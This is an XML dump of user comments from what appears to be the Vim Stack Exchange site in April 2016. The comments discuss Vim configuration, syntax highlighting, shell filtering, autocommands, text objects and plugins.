  <row Id="11757" PostId="7166" Score="0" Text="Or maybe `Ctrl-o` ? :D" CreationDate="2016-04-03T13:18:37.877" UserId="1800" />
  <row Id="11758" PostId="7162" Score="0" Text="@gracious1 *This* will enable bold/underline, `:syntax off` *won't. ;-)" CreationDate="2016-04-03T13:46:56.940" UserId="51" />
  <row Id="11759" PostId="7160" Score="1" Text="@romainl On Debian, the detault `/etc/vim/vimrc` has `syntax on`." CreationDate="2016-04-03T13:48:24.323" UserId="51" />
  <row Id="11760" PostId="7160" Score="0" Text="@Carpetsmoker it does? In my case (Ubuntu 14.04), it is commented out. (pretty much the entire file is commented out, except `runtime! debian.vim`, and `source /etc/vim/vimrc.local`). `/usr/share/vim/vim74/debian.vim` has other things. but nothing about `syntax`. `/etc/vim/vimrc.local` is for the sysad to make." CreationDate="2016-04-03T13:54:01.737" UserId="205" />
  <row Id="11761" PostId="7160" Score="0" Text="@muru Oops, it's indeed commented out on *Debian*, but on Ubuntu 15.10 it's enabled. Guess this changed between 14.04 and 15.10..." CreationDate="2016-04-03T13:57:21.163" UserId="51" />
  <row Id="11762" PostId="7160" Score="0" Text="@muru  All I know is that on my system, the syntax colors appeared after I installed vim-nox on 14.04.  I did not explicitly enable them, so it must have been a default setting." CreationDate="2016-04-03T14:20:31.500" UserId="1705" />
  <row Id="11763" PostId="7162" Score="0" Text="Yes, that's what I meant!" CreationDate="2016-04-03T14:25:00.030" UserId="1705" />
  <row Id="11764" PostId="7160" Score="0" Text="@gracious1 Nope. `/etc/vim/vimrc` is provided by `vim-common`, which is a dependency of `vim-tiny`. That file was already present when you installed `vim-nox`. It's just that `vim-tiny` has `compatible` set, so it doesn't do syntax highlighting. vim-nox doesn't have compatible set, so any existing `syntax on` or `syntax enable` took effect when you ran that. You, or someone else sharing your computer, has `syntax on` in a startup file." CreationDate="2016-04-03T14:26:24.693" UserId="205" />
  <row Id="11765" PostId="7160" Score="1" Text="Oh, no, I was wrong. I'm using pi-rho's PPA, and pi-rho does have it commented out where Ubuntu's `/etc/vim/vimrc` doesn't. Looks like @Carpetsmoker was right." CreationDate="2016-04-03T14:29:49.197" UserId="205" />
  <row Id="11766" PostId="7171" Score="1" Text="Yes, `:set background=dark` would have worked. You could add that to `~/.vimrc` or `~/.vim/vimrc` as well, instead of modifying files in `/etc`." CreationDate="2016-04-03T14:44:01.567" UserId="205" />
  <row Id="11768" PostId="7138" Score="0" Text="I have found this: https://github.com/taku25/vim-visualstudio What do you think about this one?" CreationDate="2016-04-03T16:58:56.747" UserId="5328" />
  <row Id="11769" PostId="7163" Score="0" Text="Is this a bit like the dispatch.vim plugin? I mean, assign the :make command to use the CL Visual Studio compiler and capture the errors, and feed them in the quickfix window?" CreationDate="2016-04-03T17:00:19.903" UserId="5328" />
  <row Id="11770" PostId="7168" Score="0" Text="Thanks, this has prompted me to learn about `showbreak` and `breakindent` which do work quite nicely along with `linebreak` to make thin windows much more readable!" CreationDate="2016-04-03T17:00:29.527" UserId="390" />
  <row Id="11771" PostId="7163" Score="0" Text="@symbolix, my suggestion is worse than using Tim Pope's (@tpope) `dispatch.vim` plugin. I'll edit my answer to include that as the preferred way to integrate compiler support with vim. It's ability to do work asynchronously is particularly attractive." CreationDate="2016-04-03T18:00:06.710" UserId="2062" />
  <row Id="11773" PostId="7138" Score="0" Text="does not the vim plugin meet your needs ?" CreationDate="2016-04-03T16:29:21.223" UserId="6124" />
  <row Id="11774" PostId="7166" Score="1" Text="@VanLaser thanks for correcting it. It was Ctrl + i" CreationDate="2016-04-03T18:42:41.300" UserId="7064" />
  <row Id="11775" PostId="7168" Score="0" Text="I think this is perhaps possible to enhance to use for a window which is not the current window. But for right now my script does still use the technique of moving around with `wincmd j` and so forth so these functions are sufficient." CreationDate="2016-04-03T21:05:40.793" UserId="390" />
  <row Id="11776" PostId="7168" Score="0" Text="This incorrectly counts lines that are empty (adding zero to `numlines`). I will edit when I have a code fix." CreationDate="2016-04-03T21:52:22.537" UserId="390" />
  <row Id="11777" PostId="7168" Score="0" Text="I have applied the code change that makes it work well now. It does appear to (in my very few test cases) correctly determine the height. However I am really confused about how it is able to magically take into account the `linebreak` contributions. It must internally be aware of the window width and using that... it would be probably much more sensible if this function just went and did that division for us instead of giving us this otherwise useless column count." CreationDate="2016-04-03T22:18:03.000" UserId="390" />
  <row Id="11779" PostId="7175" Score="0" Text="Hi, muru: Yes, what you said was beginning to dawn on me. I put in a test of extglob in my bashrc, then did `!!bash` when the vim cursor was on `shopt extglob`. I got conflicting extglob statuses, one on the vim command line, and another replacing the cursor line. So the shelling out was interactive, but the invocation of bash in `!!bash` was not.  Would you be able to complete your answer with an indication of how one might replace a bunch of contiguous lines in the vim buffer with the result of the execution of those lines by an interactive bash shell?" CreationDate="2016-04-04T01:38:33.047" UserId="7041" />
  <row Id="11780" PostId="7175" Score="0" Text="`:. w !bash` doesn't do it (as an example of applying this to the single-line range `.,.`.   P.S. At this point, I only want the interactiveness to apply when shelling out from vim.  I don't want to figure out the rat's nest of possible side-effects if I *always* have bash start interactively." CreationDate="2016-04-04T01:41:46.280" UserId="7041" />
  <row Id="11781" PostId="7175" Score="0" Text="@user2153235 why not just `!!bash -i`?" CreationDate="2016-04-04T01:42:43.347" UserId="205" />
  <row Id="11782" PostId="7175" Score="0" Text="Tried it. There is some weird side effect where I get 11 repetitions of prompt control characters followed by `$Use &quot;exit&quot; to leave the shell.`.  If this is the only way, I have some troubleshooting ahead of me." CreationDate="2016-04-04T01:45:43.097" UserId="7041" />
  <row Id="11783" PostId="7175" Score="0" Text="@user2153235 Hmm, in my case I get the output in the file as expected. O.o Can you explain what is it you're trying to achieve? If the aim is to just have `shopt -s nullglob` for some commands in your current file, why not add `shopt -s nullglob` as the first command?" CreationDate="2016-04-04T01:47:59.420" UserId="205" />
  <row Id="11784" PostId="7175" Score="0" Text="I often have a log file (like a lab journal, capturing stream of thought) together with commands that I temporarily assemble for the sole purpose of running through bash in order to capture the output in the same log file.  I added a diagnostic message to my `~/.bashrc` to determine if the 11 repeated messages was due to recursive invocation of `~/.bashrc`, but it wasn't.  If I bang out on a line `echo dog`, the 11 repetitions occur after the `dog` message." CreationDate="2016-04-04T01:49:58.023" UserId="7041" />
  <row Id="11785" PostId="7168" Score="0" Text="@StevenLu This function uses exactly the same code that is used by Vim to draw line on screen (you may see that f_linebreak from eval.c and win_line from screen.c both use win_lbr_chartabsize, though f_linebreak has a few more layers on top of that). And no, *that* internal function does not return a number of lines. Basically by introducing strdisplaywidth() Bram provided access to some rather internal function and I have no idea how much work it would be if this function did not exist: it existed at least since 7.0.1." CreationDate="2016-04-04T01:57:08.217" UserId="2566" />
  <row Id="11787" PostId="7175" Score="1" Text="Works like a charm, muru.  Thank you for that, and for the hint about setting shell options for `:!` commands." CreationDate="2016-04-04T02:12:49.560" UserId="7041" />
  <row Id="11788" PostId="7173" Score="0" Text="https://github.com/philc/vimium/issues" CreationDate="2016-04-04T05:57:10.457" UserId="54" />
  <row Id="11789" PostId="7176" Score="0" Text="The cursor color is handled by your terminal emulator, not by Vim." CreationDate="2016-04-04T06:04:22.390" UserId="54" />
  <row Id="11790" PostId="7176" Score="0" Text="OK, so does that mean the `Cursor` highlight group is not meaningful for mintty?  Would this be *the* answer to the question?  If so, it might be useful for you to enter it as an answer (just a suggestion)." CreationDate="2016-04-04T06:42:46.050" UserId="7041" />
  <row Id="11791" PostId="7176" Score="0" Text="I navigated to the mintty options and checked what the foreground, background, and cursor colours were.  Setting the cursor color there seems to work.  Thanks.  Again, feel free to enter your answer as an official answer." CreationDate="2016-04-04T06:58:40.083" UserId="7041" />
  <row Id="11794" PostId="7179" Score="1" Text="Would [`:h :keepjumps`](http://vimdoc.sourceforge.net/htmldoc/motion.html#:keepjumps) be what you are looking for?" CreationDate="2016-04-04T11:38:54.427" UserId="1841" />
  <row Id="11795" PostId="7179" Score="1" Text="@statox, no, the screen still changes. keepj. seems to preserve some marks and lists, not the screen." CreationDate="2016-04-04T11:49:30.053" UserId="4505" />
  <row Id="11796" PostId="7177" Score="0" Text="On Cygwin's mintty terminal, the terminal emulator parameters are accessed via the pulldown menu.  Click on the Cygwin icon on the upper left corner of the terminal window and select `Options...`." CreationDate="2016-04-04T11:58:15.237" UserId="7041" />
  <row Id="11797" PostId="7179" Score="0" Text="Arf I read your question too fast, sorry :-)" CreationDate="2016-04-04T11:59:43.560" UserId="1841" />
  <row Id="11798" PostId="7182" Score="0" Text="I have http://ex-vi.sourceforge.net/ installed, which is a port of the original Vi. How do I start this open mode? The manpage mentiones it when talking about `^R`, but gives no other help. `:open some/file` returns `open: No such command from open/visual`." CreationDate="2016-04-04T15:46:12.853" UserId="205" />
  <row Id="11801" PostId="7105" Score="0" Text="Thanks @Carpetsmoker. I took the liberty of updating my question with the information you provided." CreationDate="2016-04-04T18:42:54.673" UserId="475" />
  <row Id="11805" PostId="2268" Score="0" Text="@Doorknob, I think you might find find [this discussion of answers-as-comments](http://meta.unix.stackexchange.com/a/3927/135943) interesting.  Since your comment has three upvotes and no comments responding to tell you it's incorrect, it's *probably* correct (I'm not sure), but suggested edits et. al. are impossible to improve its accuracy.  As a posted answer, it could be edited for improved accuracy, upvoted, downvoted, responded to, etc." CreationDate="2016-04-04T20:23:13.010" UserId="4676" />
  <row Id="11806" PostId="7168" Score="0" Text="@StevenLu Last edit regarding folds 1. did not take into account that in this case fold is 1 line 2. if you want to proceed with gj-based definition you need to also take into account `&amp;foldopen` and solution becomes really weird and 3. you cannot do this with a `:for` cycle, this should be `:while` cycle with `lnr` able to increment not only by 1." CreationDate="2016-04-05T01:42:41.737" UserId="2566" />
  <row Id="11807" PostId="7168" Score="0" Text="Hmm I was just adapting the original function you posted which used the `for lnr in range(startlnr, endlnr)` construction. Yes I think there are still flaws with this current code. If the top folded line is over-long it's wrong since when it is closed it would not wrap." CreationDate="2016-04-05T01:47:32.153" UserId="390" />
  <row Id="11808" PostId="7168" Score="0" Text="My use of `gj` to define the problem was mostly to illustrate that some lines require `gj` more than once e.g. take up more physical space depending on the width of the window and a whole host of options as we see here. The real purpose is to set the height of the window (if file small enough) so it will fit perfectly." CreationDate="2016-04-05T01:50:31.297" UserId="390" />
  <row Id="11809" PostId="7168" Score="0" Text="@StevenLu In any case it is better to use `while` cycle here. Though I have mistaken what exactly `foldclosed*()` do: do not remember which exactly, but some fold function required to be run only on the first line of the fold." CreationDate="2016-04-05T01:54:24.057" UserId="2566" />
  <row Id="11810" PostId="7168" Score="0" Text="Ah, your comment makes more sense then." CreationDate="2016-04-05T01:55:30.560" UserId="390" />
  <row Id="11811" PostId="5130" Score="0" Text="@SatoKatsura that command is some serious dark magic. I am very surprised that aside from not knowing about the `==#` operator which `:h` helped clear up I actually understood the entire freaking command. Does that make me a Vim expert? Gotta be something like that. Need to get out more." CreationDate="2016-04-05T02:20:39.840" UserId="390" />
  <row Id="11812" PostId="7190" Score="0" Text="IIRC using `&lt;C-a&gt;` in visual mode was added fairly recently. Which Vim version are you using?" CreationDate="2016-04-05T04:59:54.943" UserId="51" />
  <row Id="11813" PostId="7191" Score="0" Text="This doesn't account for `g&lt;C-a&gt;` not working..." CreationDate="2016-04-05T05:45:56.170" UserId="51" />
  <row Id="11814" PostId="7191" Score="0" Text="ah....i read the post again, and found out it could be related to 'help files', if you try to 'modify' in that read-only split window, `E21` is the error message. Just tried that and got `E21`, this could be the reason, but it has nothing to do with a normal editable file, just provide more clues here." CreationDate="2016-04-05T05:53:14.993" UserId="6731" />
  <row Id="11815" PostId="7190" Score="0" Text="Just for the record where is the doc saying that `g CTRL-A` increments numbers in visual mode? My Vim 7.4 [`:h g_CTRL-A`](http://vimdoc.sourceforge.net/htmldoc/various.html#g_CTRL-A) says that it is used to print memory usage statistics for debugging Vim." CreationDate="2016-04-05T07:27:30.033" UserId="1841" />
  <row Id="11816" PostId="7191" Score="1" Text="Actually not only help buffer are affected by the `modifiable` setting: The user can use `set nomodifiable` to other buffers if he wishes. See [`:h 'modifiable'`](http://vimdoc.sourceforge.net/htmldoc/options.html#%27modifiable%27)" CreationDate="2016-04-05T07:32:20.517" UserId="1841" />
  <row Id="11817" PostId="7190" Score="0" Text="@statox see [`:h v_g_CTRL-A`](http://vimhelp.appspot.com/change.txt.html#v_g_CTRL-A). I think Carpetsmoker's right and this has to do with the Vim version. On Arch, or with the pi-rho PPA on Ubuntu 14.04, this works, but on Ubuntu 14.04 with the repository Vim (7.4, patches 1-52), it doesn't work." CreationDate="2016-04-05T07:54:10.587" UserId="205" />
  <row Id="11818" PostId="7190" Score="0" Text="@muru Thanks for the link I didn't find the topic because it is not included in my version so I think you and Carpetsmoker are right it must be because OP doesn't have the correct version." CreationDate="2016-04-05T08:11:26.313" UserId="1841" />
  <row Id="11819" PostId="7194" Score="0" Text="According to [`:h :s`](http://vimdoc.sourceforge.net/htmldoc/change.html#:s) you can use a count after a substitute command like `:%s/_exclude// 1` but for a reason that I don't understand it begins with the last line of the range so it would have an action on `rule4`. Also you talk about removing the whole line but your substitute command only remove the word `_exclude` is it what you actually want? Finally wouldn't a search `/_exclude` followed by normal mode `dd` wouldn't be what you're looking for?" CreationDate="2016-04-05T10:06:36.057" UserId="1841" />
  <row Id="11820" PostId="7194" Score="0" Text="Removing only `_exclude` text, not the line." CreationDate="2016-04-05T10:09:18.647" UserId="467" />
  <row Id="11821" PostId="7195" Score="4" Text="You can condense that to `:/_exclude/s///`. If given an empty pattern, `:s` will re-use the previous pattern, which, in this case would be `_exclude` from `:/`." CreationDate="2016-04-05T10:41:22.157" UserId="205" />
  <row Id="11822" PostId="7194" Score="0" Text="you can do a substitution using line number if you know line numbers" CreationDate="2016-04-05T11:29:33.983" UserId="7079" />
  <row Id="11823" PostId="7194" Score="0" Text="@Raju I assume I won't be able to know the line numbers." CreationDate="2016-04-05T11:30:17.537" UserId="467" />
  <row Id="11824" PostId="7194" Score="2" Text="http://stackoverflow.com/a/25840884/1848140&#xA;try this" CreationDate="2016-04-05T11:33:43.083" UserId="7079" />
  <row Id="11825" PostId="7194" Score="0" Text="or may be this :%s/word/newword/gc asks for confirmation on every replacement." CreationDate="2016-04-05T11:34:55.887" UserId="7079" />
  <row Id="11826" PostId="7194" Score="0" Text="@Raju Could work with confirmation, however in my case I'm planning to perform this action non-interactively one by one with Ex as shown in [here](http://vi.stackexchange.com/q/7201/467)." CreationDate="2016-04-05T11:41:49.297" UserId="467" />
  <row Id="11827" PostId="6792" Score="0" Text="@VanLaser Thanks for reminding us that any time someone asks something that was revealed in the help it is completely impossible that they did not already look in the help. Obviously using Vim's help to look for anything at all is extremely easy and intuitive, and anyone searching for anything there would quickly be successful in finding and understand the information they are looking for. Now that I think about it, this website is not helpful at all, and should just be replaced with an issue tracker for ways Vim's help can be improved or added to..." CreationDate="2016-04-05T12:38:06.293" UserId="1410" />
  <row Id="11828" PostId="7211" Score="1" Text="[This plugin](https://github.com/thinca/vim-textobj-comment) provides text objects for comments. Note that I don't use it anymore and I don't remember the reason why so it might be a bit buggy." CreationDate="2016-04-05T12:39:13.653" UserId="1841" />
  <row Id="11829" PostId="6792" Score="0" Text="So did you look in the help file, or you found it not so extremely easy and intuitive to read? Personally, I would *love* to see on this site questions that *don't* have an answer already given in Vim's help :)" CreationDate="2016-04-05T13:32:22.553" UserId="1800" />
  <row Id="11830" PostId="7211" Score="1" Text="Yes, that is the solution, thank you!" CreationDate="2016-04-05T14:04:04.110" UserId="5280" />
  <row Id="11831" PostId="7213" Score="1" Text="[Commentary.vim](https://github.com/tpope/vim-commentary) also provides the `gc` text object. e.g. `dgc`" CreationDate="2016-04-05T14:30:28.013" UserId="778" />
  <row Id="11832" PostId="7213" Score="0" Text="@PeterRincker: I've never used Commentary.vim but from reading the readme I'm not sure `gc` is the same thing: is it possible for example to do something like `vgc` to visually select the content of a comment?" CreationDate="2016-04-05T14:33:33.263" UserId="1841" />
  <row Id="11833" PostId="7213" Score="0" Text="Commentary.vim does not provide a visual mode mapping for `gc`. It only provides an operator pending mode mapping. I pretty much only use if for toggling a comment block via: `gcgc`" CreationDate="2016-04-05T14:36:08.353" UserId="778" />
  <row Id="11834" PostId="7213" Score="1" Text="That sounds pretty useful. Actually I created this answer because I suggested vim-textobj-comment in the comments of the question and OP said it was what he wanted but maybe you should also add an answer with commentary.vim if it fills the needs of the question." CreationDate="2016-04-05T14:39:35.437" UserId="1841" />
  <row Id="11835" PostId="7193" Score="0" Text="Which commands are you using? `gq`?" CreationDate="2016-04-05T15:34:07.580" UserId="51" />
  <row Id="11836" PostId="7192" Score="0" Text="Your explanation makes sense to me, and I was quite surprised that my original attempt didn’t work. Unfortunately, your suggestion didn’t seem to fix things. Is there some way that I could check what highlight group is being used under the cursor or something along those lines? Even running `hi diffAdded term=NONE ctermfg=Green ` directly while editing a commit message doesn’t seem to do anything." CreationDate="2016-04-05T16:13:43.947" UserId="354" />
  <row Id="11837" PostId="7192" Score="0" Text="@AlexisKing Sure, this should give you the highlight group name: `:echo synIDattr(synID(line('.'), col('.'), 1), 'name')`... I tried this with `git commit -v` by the way, and it works fine for me ... Not sure why it doesn't for you. You can try following the stepts in [How do I debug my vimrc file?](http://vi.stackexchange.com/q/2003/51)" CreationDate="2016-04-05T16:19:09.117" UserId="51" />
  <row Id="11838" PostId="7192" Score="0" Text="Weird! After some more inspection, it seems to actually be working, but for some reason the `Green` color renders differently when I run `git commit -v` and `git diff`. Anyway, that’s a separate problem, so I will continue to investigate it myself. Sorry for the small XY problem, and thanks for your help!" CreationDate="2016-04-05T16:35:24.227" UserId="354" />
  <row Id="11840" PostId="7224" Score="0" Text="I have often heard people map `jj` to `&lt;esc&gt;`, since `jj` is rarely seen in actual typing. You could do something like that: `inoremap jj &lt;Backspace&gt;`." CreationDate="2016-04-06T08:00:58.060" UserId="205" />
  <row Id="11841" PostId="7224" Score="0" Text="Muru's idea is not bad: I use `jk` because it feels easier than typing the same key twice, if you really want to remap backspace that cool be an option." CreationDate="2016-04-06T09:24:05.227" UserId="1841" />
  <row Id="11842" PostId="7228" Score="1" Text="Fantastic! Thanks. (Anyone that like me misses why `.` will repeat the entire action, and can't make it work - read more carefully - `c` first! Couldn't ask for better.)" CreationDate="2016-04-06T10:27:06.457" UserId="5778" />
  <row Id="11843" PostId="7228" Score="3" Text="Note that you can also use `gN` to visually select the previous match." CreationDate="2016-04-06T11:52:00.947" UserId="1841" />
  <row Id="11847" PostId="7221" Score="0" Text="It might be a bug. Consider reporting at https://github.com/macvim-dev/macvim/issues" CreationDate="2016-04-06T12:17:58.737" UserId="205" />
  <row Id="11848" PostId="7230" Score="2" Text="See [`:h _`](http://vimhelp.appspot.com/motion.txt.html#_). In particular: *linewise*." CreationDate="2016-04-06T12:24:31.197" UserId="205" />
  <row Id="11849" PostId="7230" Score="0" Text="Thank you for the tip. It is clearly not a bug. But why is it done this way? Any logic behind it?" CreationDate="2016-04-06T12:26:44.547" UserId="3230" />
  <row Id="11850" PostId="7221" Score="0" Text="I thought Vim was different from MacVim. If I used `brew install vim` and not  `brew install macvim` would that still be the place to report it?" CreationDate="2016-04-06T12:28:03.427" UserId="5043" />
  <row Id="11851" PostId="7221" Score="0" Text="No, I assumed you were on MacVim. Sorry about that." CreationDate="2016-04-06T12:29:52.757" UserId="205" />
  <row Id="11852" PostId="7230" Score="1" Text="I think that the intended way to select to the start of the line is use `^` or `0` depending on what start of the line means." CreationDate="2016-04-06T12:31:33.560" UserId="205" />
  <row Id="11853" PostId="7230" Score="0" Text="Ah, ok. Unfortunately ^ isn't good accessible on a German keyboard :/" CreationDate="2016-04-06T12:36:31.700" UserId="3230" />
  <row Id="11854" PostId="7230" Score="6" Text="@BorisBrodski As @muru said, the reason is that `_` is a linewise motion, not characterwise. It selects entire lines. However, when you use a motion as a text object with an operator, you can temporarily force it to be characterwise by prefixing it with `v`. So, if you really wanted to delete from the cursor until the first non whitespace using the `_` motion, you could type `dv_`." CreationDate="2016-04-06T12:37:02.000" UserId="6960" />
  <row Id="11855" PostId="7223" Score="0" Text="Your solution works, but I don't see the advantage of using `BufReadCmd` over using `BufRead`. I am still hoping there is some workaround to cancel reading the to be read file." CreationDate="2016-04-06T13:19:38.257" UserId="4947" />
  <row Id="11856" PostId="7230" Score="2" Text="@BorisBrodski: About `^` which isn't easily accessible see [`:h 'langmap'`](http://vimdoc.sourceforge.net/htmldoc/options.html#%27langmap%27). That can be useful." CreationDate="2016-04-06T13:23:42.100" UserId="1841" />
  <row Id="11857" PostId="7223" Score="0" Text="@ultrabowser O.o the advantage of using `BufReadCmd` is that you **aren't** reading the file in Vim." CreationDate="2016-04-06T13:29:54.620" UserId="205" />
  <row Id="11858" PostId="7223" Score="0" Text="Oh I see! It opens a new _empty_ buffer, and that is why you call `bd`. Brilliant. It still messes up the window-layout, but vim-buffkill can probably come to the for that issue." CreationDate="2016-04-06T13:33:38.857" UserId="4947" />
  <row Id="11859" PostId="7223" Score="1" Text="@ultrabowser Yes. Vim opens an empty buffer, and then this autocmd is supposed to read the contents of the file. Instead, we just call `open`, and skip reading the file, and delete the now unnecessary buffer." CreationDate="2016-04-06T13:35:22.513" UserId="205" />
  <row Id="11860" PostId="7223" Score="0" Text="Thanks! Didn't know you could replace vim's actions, polymorphic style. Follow-up question would be: how to prevent entering the new buffer? Can the whole chain of events be canceled on `BufAdd`?" CreationDate="2016-04-06T13:43:40.027" UserId="4947" />
  <row Id="11862" PostId="7233" Score="1" Text="how about open the qf window?" CreationDate="2016-04-06T14:09:51.697" UserId="1569" />
  <row Id="11863" PostId="7228" Score="0" Text="What's the difference between this and just pressing `n` to get to the next search result?" CreationDate="2016-04-06T14:42:17.860" UserId="3209" />
  <row Id="11864" PostId="7228" Score="0" Text="it does the change also, so instead of repeating `n.` (next occurence, repeat the modification), you can just press `.` (repeat the modification, which is &quot;change the next occurence&quot;)" CreationDate="2016-04-06T16:25:33.273" UserId="1821" />
  <row Id="11865" PostId="7230" Score="1" Text="Or @BorisBrodski you can `nnoremap ^` to a more accessible key." CreationDate="2016-04-06T19:42:48.283" UserId="2303" />
  <row Id="11866" PostId="7230" Score="0" Text="@user9433424 , Cometsong and statox Thank you for the cool tips. Please, add those as answers, so I can upvote them!" CreationDate="2016-04-06T19:49:50.720" UserId="3230" />
  <row Id="11867" PostId="7193" Score="0" Text="Yes. gq{movement}" CreationDate="2016-04-07T06:19:59.480" UserId="5919" />
  <row Id="11868" PostId="7241" Score="1" Text="c-o will take you back to the last cursor position, not the last screen state" CreationDate="2016-04-07T09:05:57.627" UserId="4505" />
  <row Id="11869" PostId="7241" Score="0" Text="you are right, let me update my answer (if I find out how ;) )" CreationDate="2016-04-07T09:06:52.580" UserId="1821" />
  <row Id="11870" PostId="7241" Score="0" Text="answer updated." CreationDate="2016-04-07T09:15:21.250" UserId="1821" />
  <row Id="11871" PostId="7241" Score="0" Text="nice, thanks! do you think there is a way to do this always, without calling a special command?" CreationDate="2016-04-07T10:41:43.660" UserId="4505" />
  <row Id="11874" PostId="7242" Score="2" Text="What are you trying to do? [(XY Problem)](http://meta.stackexchange.com/a/66378/188334)" CreationDate="2016-04-07T11:02:47.310" UserId="1405" />
  <row Id="11875" PostId="7242" Score="2" Text="Currently i want to find out if the cursor is at the beginning or at the end of the visual selection.  But this is also a question about working with cursor positions in Vim script.  Since there is apparently no separate site about programming Vim in Vim script, i am asking it here." CreationDate="2016-04-07T11:22:41.837" UserId="1248" />
  <row Id="11876" PostId="7241" Score="0" Text="I don't think so, as said in my answer, I haven't found any option while looking at the documentation for the ex command. But if one exists, I would be happy to know :)" CreationDate="2016-04-07T11:31:57.200" UserId="1821" />
  <row Id="11877" PostId="7242" Score="4" Text="Your comparison doesn't look that ugly, but to avoid rewriting it you could wrap it in a function." CreationDate="2016-04-07T11:34:39.523" UserId="1841" />
  <row Id="11878" PostId="7243" Score="0" Text="have you tried something like: `:!R` ? You can pass to an external program lines from your buffer. e.g. in visual mode with a selection: `:'&lt;,'&gt;!ls`" CreationDate="2016-04-07T11:34:55.387" UserId="1821" />
  <row Id="11879" PostId="7245" Score="3" Text="I recommend you read/watch: http://vimcasts.org/episodes/meet-the-arglist/" CreationDate="2016-04-07T11:38:19.847" UserId="1821" />
  <row Id="11881" PostId="7243" Score="0" Text="Maybe https://github.com/jalvesaq/Nvim-R is a good idea?" CreationDate="2016-04-07T12:15:48.407" UserId="1296" />
  <row Id="11882" PostId="7241" Score="0" Text="Maybe you could use an autocommand? Maybe with WinEnter/WinLeave you could do something... Or how about remapping `:` to first save the view, then start the command window with a `:` in it and then restore the view on WinEnter?" CreationDate="2016-04-07T12:50:46.367" UserId="1296" />
  <row Id="11883" PostId="7241" Score="0" Text="remapping `:` seems risky IMHO, I wouldn't have to handle every when you actually want to ove cases (like `:tabnew`) I'd rather stay with a concrete proof that I want to keep my position" CreationDate="2016-04-07T12:54:27.717" UserId="1821" />
  <row Id="11885" PostId="7241" Score="0" Text="You're right, remapping wasn't a good idea." CreationDate="2016-04-07T13:11:44.623" UserId="1296" />
  <row Id="11888" PostId="7242" Score="0" Text="Note that there might be betters solutions than comparing cursor positions if you explain what is the X problem." CreationDate="2016-04-07T13:24:30.363" UserId="1405" />
  <row Id="11889" PostId="7242" Score="0" Text="The X problem is that i want to live happily, to have my Vim finely configured, and to master Vim script and all other programming languages." CreationDate="2016-04-07T13:31:18.997" UserId="1248" />
  <row Id="11890" PostId="7242" Score="1" Text="On a smaller scale, i want my word-based motions in Visual mode to behave differently based on whether the cursor is at the beginning or at the end of the selection." CreationDate="2016-04-07T13:33:12.500" UserId="1248" />
  <row Id="11892" PostId="7243" Score="0" Text="Alternatively, I could learn how to read... sorry!" CreationDate="2016-04-07T13:38:27.637" UserId="1296" />
  <row Id="11893" PostId="7249" Score="1" Text="Did you look at the man page or the `--help` output?" CreationDate="2016-04-07T14:26:33.340" UserId="15" />
  <row Id="11894" PostId="7249" Score="0" Text="Yes. Still not sure where to start. Also modified the question somewhat." CreationDate="2016-04-07T14:29:52.667" UserId="1705" />
  <row Id="11895" PostId="7249" Score="1" Text="This nibble? http://vi.stackexchange.com/a/7123/205" CreationDate="2016-04-07T15:27:46.680" UserId="205" />
  <row Id="11896" PostId="6516" Score="0" Text="I added the following line to my .vimrc file `autocmd BufNewFile,BufRead *.md set conceallevel=0`, but it does not apply, why?  I wonder if some plugin changes it after the autocmd does, unless I am not setting it correctly." CreationDate="2016-04-07T15:32:10.660" UserId="3050" />
  <row Id="11897" PostId="7249" Score="1" Text="1. Why did you install that thing? 2. How is that linked in any way with that silly plugin? 3. Why did you install it without reading up on it? 4. Vi doesn't have a plugin system. 5. What is your ultimate goal?" CreationDate="2016-04-07T15:39:05.180" UserId="54" />
  <row Id="11898" PostId="7249" Score="2" Text="I've never used this package, but if you're new to Vim I would recommend that you read [this question](http://vi.stackexchange.com/questions/388/what-is-the-difference-between-the-vim-package-managers/3678#3678) about (good) plugin managers. Most of them are linked to their github repo containing a simple installation procedure. For example with Vim-plug you just have to do a `curl`, add two lines to your `.vimrc` and you're ready to have fun with plugins :-)" CreationDate="2016-04-07T15:42:16.887" UserId="1841" />
  <row Id="11899" PostId="7243" Score="0" Text="@Nobe4 I am afraid that might not work, as I need to pass it to the current instance. Plugins like n-vim I believe rely on simulating some sort of TCP server to communicate between the two software. But I do not know enough to work that out. I shall try though." CreationDate="2016-04-07T18:42:20.600" UserId="6854" />
  <row Id="11900" PostId="7241" Score="1" Text="If there are few ex commands that are used frequently, then it might be easier to create aliases for them, e.g.: `:%S/a/b/g`, `:G/a/d`, `:V/a/d`." CreationDate="2016-04-07T19:38:14.830" UserId="1405" />
  <row Id="11901" PostId="7251" Score="1" Text="Possible [X/Y problem](http://meta.stackexchange.com/questions/66377/what-is-the-xy-problem). What exactly are you trying to do? Have buffer specific mappings (See `:h :map-local`), buffer commands (See `:h :command-buffer`), or buffer local settings (See `:h setlocal`)?" CreationDate="2016-04-07T20:53:20.507" UserId="778" />
  <row Id="11902" PostId="7251" Score="1" Text="I would like to be able to come up with a buffer enter/leave event that is not depending on long file extension lists. Ideally, dealing with the file extensions problem in a 'ftdetect' script, and put ambiguous file extensions such  as '*.h, *.C, *.CXX' into a 'cpp' file type, so we keep adding to these in order to include new extensions into the defined file type and on the 'BufEnter' and 'BufLeave' side we just use the FileType tag, such as 'cpp' instead of a long list of constantly growing extensions." CreationDate="2016-04-07T21:37:31.543" UserId="5328" />
  <row Id="11903" PostId="7251" Score="1" Text="I understand what the kind of `autocmd` pattern you are trying to craft (Spoiler: your `autocmd * if &amp;ft` method is the correct way to do this). My question to you is what are your `ExecuteEnter()`/`ExecuteLeave()` supposed to be doing? More than likely you are trying to add buffer specific mappings/commands/settings, of which there are better ways methods." CreationDate="2016-04-07T21:46:21.877" UserId="778" />
  <row Id="11904" PostId="7251" Score="1" Text="I would like to set an option, set completeopt-=preview when entering C++ or C buffers and set completeopt+=preview when leaving C++ or C buffers. But nowadays, the C/C++ files may have a very rich variety of extensions, writing down all of these seems too laborious and not very smart." CreationDate="2016-04-07T21:55:34.843" UserId="5328" />
  <row Id="11905" PostId="7253" Score="1" Text="Cool. It seems like this has to be an '*' event. Why would you prefer WinEnter over BufEnter? Also, why do we need the 'FileType' in there? Is not WinEnter (or BuffEnter) enough? Thanks." CreationDate="2016-04-07T22:29:16.510" UserId="5328" />
  <row Id="11906" PostId="7253" Score="1" Text="Using `BufEnter` is probably better (I have changed the post). The reason I use `FileType` event is in case you a buffer's `'filetype'` changes." CreationDate="2016-04-07T22:40:45.680" UserId="778" />
